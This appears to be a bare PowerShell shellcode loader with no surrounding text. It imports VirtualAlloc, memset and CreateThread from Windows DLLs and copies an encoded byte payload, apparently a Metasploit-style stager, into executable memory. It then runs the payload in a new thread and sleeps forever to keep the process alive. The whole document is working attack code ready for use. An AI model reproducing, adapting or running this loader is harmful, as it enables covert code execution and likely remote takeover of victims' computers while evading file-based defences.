
$RqV = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $RqV -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xcf,0xd9,0x74,0x24,0xf4,0x5d,0xb8,0x90,0xdd,0x2c,0xfe,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x45,0x14,0x03,0x45,0x84,0x3f,0xd9,0x02,0x4c,0x3d,0x22,0xfb,0x8c,0x22,0xaa,0x1e,0xbd,0x62,0xc8,0x6b,0xed,0x52,0x9a,0x3e,0x01,0x18,0xce,0xaa,0x92,0x6c,0xc7,0xdd,0x13,0xda,0x31,0xd3,0xa4,0x77,0x01,0x72,0x26,0x8a,0x56,0x54,0x17,0x45,0xab,0x95,0x50,0xb8,0x46,0xc7,0x09,0xb6,0xf5,0xf8,0x3e,0x82,0xc5,0x73,0x0c,0x02,0x4e,0x67,0xc4,0x25,0x7f,0x36,0x5f,0x7c,0x5f,0xb8,0x8c,0xf4,0xd6,0xa2,0xd1,0x31,0xa0,0x59,0x21,0xcd,0x33,0x88,0x78,0x2e,0x9f,0xf5,0xb5,0xdd,0xe1,0x32,0x71,0x3e,0x94,0x4a,0x82,0xc3,0xaf,0x88,0xf9,0x1f,0x25,0x0b,0x59,0xeb,0x9d,0xf7,0x58,0x38,0x7b,0x73,0x56,0xf5,0x0f,0xdb,0x7a,0x08,0xc3,0x57,0x86,0x81,0xe2,0xb7,0x0f,0xd1,0xc0,0x13,0x54,0x81,0x69,0x05,0x30,0x64,0x95,0x55,0x9b,0xd9,0x33,0x1d,0x31,0x0d,0x4e,0x7c,0x5d,0xe2,0x63,0x7f,0x9d,0x6c,0xf3,0x0c,0xaf,0x33,0xaf,0x9a,0x83,0xbc,0x69,0x5c,0xe4,0x96,0xce,0xf2,0x1b,0x19,0x2f,0xda,0xdf,0x4d,0x7f,0x74,0xf6,0xed,0x14,0x84,0xf7,0x3b,0x80,0x81,0x6f,0x04,0xfd,0x1b,0xef,0xec,0xfc,0x1b,0xfe,0xb0,0x89,0xfa,0x50,0x19,0xda,0x52,0x10,0xc9,0x9a,0x02,0xf8,0x03,0x15,0x7c,0x18,0x2c,0xff,0x15,0xb2,0xc3,0x56,0x4d,0x2a,0x7d,0xf3,0x05,0xcb,0x82,0x29,0x60,0xcb,0x09,0xde,0x94,0x85,0xf9,0xab,0x86,0x71,0x0a,0xe6,0xf5,0xd7,0x15,0xdc,0x90,0xd7,0x83,0xdb,0x32,0x80,0x3b,0xe6,0x63,0xe6,0xe3,0x19,0x46,0x7d,0x2d,0x8c,0x29,0xe9,0x52,0x40,0xaa,0xe9,0x04,0x0a,0xaa,0x81,0xf0,0x6e,0xf9,0xb4,0xfe,0xba,0x6d,0x65,0x6b,0x45,0xc4,0xda,0x3c,0x2d,0xea,0x05,0x0a,0xf2,0x15,0x60,0x8a,0xce,0xc3,0x4c,0xf8,0x3e,0xd0;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$IYT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($IYT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$IYT,0,0,0);for (;;){Start-sleep 60};

